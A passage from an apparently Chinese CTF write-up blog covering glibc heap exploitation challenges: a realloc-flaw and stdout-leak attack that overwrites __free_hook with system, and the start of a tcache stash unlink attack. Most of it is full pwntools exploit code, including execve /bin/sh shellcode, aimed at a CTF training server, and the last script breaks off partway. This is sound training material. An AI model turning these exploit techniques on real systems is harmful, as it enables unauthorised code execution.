nop;
xchg rsi,rdx;
syscall
'''</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'start!!!!'</span><span class="token punctuation">,</span>code<span class="token punctuation">)</span>
real_dis<span class="token operator">=</span><span class="token number">0xfff</span><span class="token operator">+</span>dis
shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
push SYS_execve
pop rax
xchg rsi,rdi
xor rdx,rdx
syscall 
'''</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00\x00'</span><span class="token operator">+</span>shellcode<span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="34-BUU-TWCTF-online-2019-asterisk-alloc-realloc缺陷，IO-leak爆破"><a href="#34-BUU-TWCTF-online-2019-asterisk-alloc-realloc缺陷，IO-leak爆破" class="headerlink" title="34.BUU TWCTF_online_2019_asterisk_alloc(realloc缺陷，IO_leak爆破)"></a>34.BUU TWCTF_online_2019_asterisk_alloc(realloc缺陷，IO_leak爆破)</h2><p>一道利用了realloc缺陷的题目，挺有意思，记录一下2.27，amd64保护全开，给了malloc,calloc,realloc三个功能，还有free，没有show，所以用ioleak</p>
<p><img src="/images/QQ_1726217937951.png" alt="img"></p>
<p>malloc和calloc都只能用一次</p>
<p><img src="/images/QQ_1726218332387.png" alt="img"></p>
<p>realloc可以使用多次，但只能修改ptr_r。</p>
<p><img src="/images/QQ_1726218524415.png" alt="img"></p>
<p>存在uaf，可以doublefree</p>
<p><img src="/images/QQ_1726218707908.png" alt="img"></p>
<p>如果只能用三次申请肯定是不可能成功的，所以需要考虑如何解决，这道题目用到了realloc的特性：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">realloc(ptr, new_size);
&#x2F;&#x2F; realloc函数可以重新调整之前分配的内存块的大小。
&#x2F;&#x2F; 若ptr为0且new_size &gt; 0，则相当于malloc(new_size)
&#x2F;&#x2F; 若new_size为0，则会将ptr进行free
&#x2F;&#x2F; 若new_size非法，则会return NULL
&#x2F;&#x2F; 若new_size &lt; old_size - 0x20，则会chunk shrink，多余的部分会直接free
&#x2F;&#x2F; 若new_size &gt; old_size，高地址处的chunk为top chunk则直接扩展；高地址处为free状态的chunk，则需要后面free的chunk合并，判断切割后能否满足，否则直接申请新的chunk，复制到新的chunk中，将以前的chunk进行free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对于<code>ptr_r = realloc(ptr_r, size);</code>，如果返回值为NULL，就会清空ptr_r，从而可以多次申请新的chunk，利用这一点就可以实现无限次的申请了。</p>
<p>思路：</p>
<ul>
<li>利用double free，释放8次填满tcache，并进入unsortedbin，申请chunk切割unsortedbin，修改参与main_arena后三位到<code>_IO_2_1_stdout_</code>，进入tcache（爆破一位）</li>
<li>利用realloc缺陷，多次使用realloc申请新chunk，将<code>_IO_2_1_stdout_</code>取出修改得到libc</li>
<li>同样利用realloc缺陷打free_hook即可</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25047</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'choice: '</span>
<span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Data: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>
    
<span class="token keyword">def</span> <span class="token function">calloc</span><span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Data: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>
    
<span class="token keyword">def</span> <span class="token function">realloc</span><span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Data: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>    

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Which: '</span><span class="token punctuation">,</span>choice<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">:</span>
    malloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xf0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    calloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token string">b'm'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token string">b'm'</span><span class="token punctuation">)</span>
    <span class="token comment"># realloc(size=0xa0,content=b'\x60\x07\xdd')#调试</span>
    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x60\xa7'</span><span class="token punctuation">)</span>

    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#返回NULL，将r_ptr置零，从而可以多次使用realloc分配新chunk</span>

    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xf0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xf0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>
    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ed8b0</span> 
    leak_info<span class="token punctuation">(</span><span class="token string">'libc.address'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    <span class="token keyword">if</span> libc<span class="token punctuation">.</span>address<span class="token operator">&amp;</span><span class="token number">0xfff</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    system<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    free_hook<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>

    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xb0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>
    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xb0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xb0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    realloc<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xb0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span>choice<span class="token operator">=</span><span class="token string">'c'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token comment"># sh = process(filename)</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25047</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        pwn<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="35-BUU-Black-Watch-入群题-PWN2-tcache-stash-unlink-attack，orw"><a href="#35-BUU-Black-Watch-入群题-PWN2-tcache-stash-unlink-attack，orw" class="headerlink" title="35.BUU Black Watch 入群题 PWN2(tcache stash unlink attack，orw)"></a>35.BUU Black Watch 入群题 PWN2(tcache stash unlink attack，orw)</h2><p>一道利用tcache stash unlink的题目，很经典，记录一下</p>
<p>2.29,没开canary，有沙箱，禁用execve</p>
<p>题目有add，edit，show，delete功能，有一个后门，是一个栈溢出，刚好能覆盖ret地址</p>
<ul>
<li>add：可以申请4种大小的chunk，0x20，0x100,0x310,0x410，且都是通过calloc申请</li>
<li>edit：只可以edit一次</li>
<li>delete：存在uaf</li>
<li>后门：有使用条件，会要求一个地址的值大于0x7F0000000000，</li>
</ul>
<p>分析：存在uaf，所以可以很轻松的获取到libc地址，但因为是calloc，所以不能使用uaf修改tcache来直接打tcache。考虑使用后门来做栈迁移打orw，但因为后门有使用条件，所以需要考虑如何在指定地址写一个libc的值，因为2.29无法使用unsortedbin attack，考虑使用tcache stash unlink，</p>
<h3 id="tcache-stash-unlink"><a href="#tcache-stash-unlink" class="headerlink" title="tcache stash unlink"></a>tcache stash unlink</h3><p>适用：2.23-latest</p>
<p>作用：任意地址写一个main_arena地址</p>
<p>条件：至少使用一次calloc，能够控制smallbin的bk值，同一种大小的<code>chunk</code>在<code>tcache</code>中有<code>5</code>个，而在<code>smallbin</code>中有<code>2</code>个。（一般利用）</p>
<p>原理：在smallbin中的多个chunk，如果有一个被取出后，剩余的会按照<code>bk</code>相连的顺序进入tcache，而进入tcache时只有第一个chunk被检测，后面的没有，所以就可以构造后面的chunk实现利用。当tcache中有5个，smallbin中有两个时，因为其是通过<code>bk</code>进入tcache的，所以我们需要修改第二个进入smallbin的chunk的fd，让其指向一个我们可以控制的<code>fake_chunk</code>，这时候入股取走smallbin中的第一个，那么smallbin中的第二个就会进入tcache，接下来fake_chunk也会进入tache，如果这时候<code>fake_chunk</code>的<code>bk</code>还指向了一个地址，那么就会尝试将其也入链，<strong>其中会使得：<code>bck-&gt;fd=bin</code>，会使得<code>fake_chunk</code>的<code>bk</code>指针指向的<code>chunk</code>的<code>fd</code>写一个<code>main_arena</code>地址</strong>这里就可以实现任意地址写一个main_arena地址了，我们只要将<code>fake_chunk</code>的<code>bk</code>指针指向我们要写main_arena的地址-0x10即可，这样我们要写的地址<code>target</code>就会被视作这个chunk的fd，从而通过<code>bck-&gt;fd=bin</code>写地址</p>
<p>解决了思路来思考题目的做法：</p>
<p>首先准备好0x100大小的chunk作为打tcache stash unlink的条件，因为可以通过切割更大的unsortbin的方式让unsortedbin 中残留0x100，再让其进入smallbin。首先申请5个0x100的chunk，并进入tcache，再申请10个0x410的chunk并释放8个，1个进入unsortedbin，泄露libc，再释放最后一个，进入unsortedbin，这样unsortedbin就有两个0x410的chunk了（中间隔一个防止合并，且注意防止最后一个和topchunk合并），泄堆地址，再通过申请0x310的chunk对unsortedbin进行切割，申请3次，既可让两个被切割为0x100的进入smallbin，达成tcache stash unlink利用条件。接下来利用即可，让指定位置写入大于0x7F0000000000的main_arean值，就可以用后门函数了，再申请一个chunk写orw，后门栈迁移过来就可以了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26731</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'Your input: '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">'idx: '</span>
add_size_words <span class="token operator">=</span> <span class="token string">'4.0x400): '</span>
add_content_words <span class="token operator">=</span> <span class="token string">'ontent: '</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">'idx: '</span>

menu_show <span class="token operator">=</span> <span class="token number">4</span>
show_index_words <span class="token operator">=</span> <span class="token string">'idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">3</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'content: '</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">black</span><span class="token punctuation">(</span>content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'to say?'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>index<span class="token operator">=</span>i<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span>i<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>index<span class="token operator">=</span>i<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>   
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span>i<span class="token punctuation">)</span>
